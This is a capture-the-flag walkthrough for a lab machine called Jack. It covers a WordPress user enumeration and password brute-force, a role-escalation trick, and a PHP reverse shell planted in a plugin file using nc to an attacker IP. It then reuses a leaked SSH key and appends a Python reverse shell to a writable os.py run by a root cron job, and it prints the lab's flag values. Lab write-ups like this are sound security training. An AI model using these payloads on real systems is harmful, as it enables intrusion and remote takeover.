> Jack

# Nmap

nmap -sC -sV -T4 -Pn -A -vvv -oN nmap/initial $IP

```
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 3e:79:78:08:93:31:d0:83:7f:e2:bc:b6:14:bf:5d:9b (RSA)
|   256 3a:67:9f:af:7e:66:fa:e3:f8:c7:54:49:63:38:a2:93 (ECDSA)
|_  256 8c:ef:55:b0:23:73:2c:14:09:45:22:ac:84:cb:40:d2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 5.3.2
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Jack&#039;s Personal Site &#8211; Blog for Jacks writing adven...
```

Looks like a wordpress page. Let's enumerate users using wpscan.

# Wpscan - Enumerate Users

wpscan --url http://jack.thm -v -e u

```
[+] XML-RPC seems to be enabled: http://jack.thm/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
[+] WordPress version 5.3.2 identified (Insecure, released on 2019-12-18).
[+] jack
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://jack.thm/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] wendy
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] danny
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

We also know that we have XML-RPC enabled. We got 3 users. Let's save it in users file and bruteforce it.

# Wpscan - Bruteforce Login

wpscan --url "http://jack.thm" -U users.txt -P /usr/share/wordlists/fasttrack.txt -v

```
[SUCCESS] - wendy / changelater
```

We can login as wendy now.	Looking at the hints it said `ure_other_roles`. Looks like we have an exploit in exploit-db. Let's try ot manually. We have to edit the profile and capture the response and in the final line add `ure_other+reoles=Administrator`. And we are now admin. Let's try to get a shell. Let's navogate to plugin editor and add a PHP reverse shell in askimet.php and activate it.

`<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.107.21 1234 >/tmp/f") ?>`

We are in as www-data.

# user.txt

```
0052f7829e48752f2e7bf50f1231548a
```

# remainder.txt

```
Please read the memo on linux file permissions, last time your backups almost got us hacked! Jack will hear about this when he gets back.
```

Since it says backup, let's look at /var/backups. And we got an id_rsa file there. And using that we can login as jack. 

And for privilege escalation. We have a hint `Python`. Let's check through the process using pspy64. Let's transfer it to the machine. We can see a python script runnning every 2 minutes.

```
2021/05/12 02:32:01 CMD: UID=0    PID=2242   | /usr/bin/python /opt/statuscheck/checker.py 
2021/05/12 02:32:01 CMD: UID=0    PID=2241   | /bin/sh -c /usr/bin/python /opt/statuscheck/checker.py 
2021/05/12 02:32:01 CMD: UID=0    PID=2240   | /usr/sbin/CRON -f 
2021/05/12 02:32:01 CMD: UID=0    PID=2243   | /usr/bin/python /opt/statuscheck/checker.py 
```

# checker.py

```
import os

os.system("/usr/bin/curl -s -I http://127.0.0.1 >> /opt/statuscheck/output.log")
```

We have os module. Woww! But which python, on checking /usr/lib we can see 3 versions of python 

```
python2.7
python3
python3.5
```

So, let's start with 2.7. Checking in `/usr/lib/python2.7` we can find that os.py is writable. Let's drop a reverse shell at the end of os.py and capture a reverse shell.

```
import socket
import pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.8.107.21",9001))
dup2(s.fileno(),0)
dup2(s.fileno(),1)
dup2(s.fileno(),2)
pty.spawn("/bin/bash")
s.close()
```

And we are root!

# root.txt

```
b8b63a861cc09e853f29d8055d64bffb
```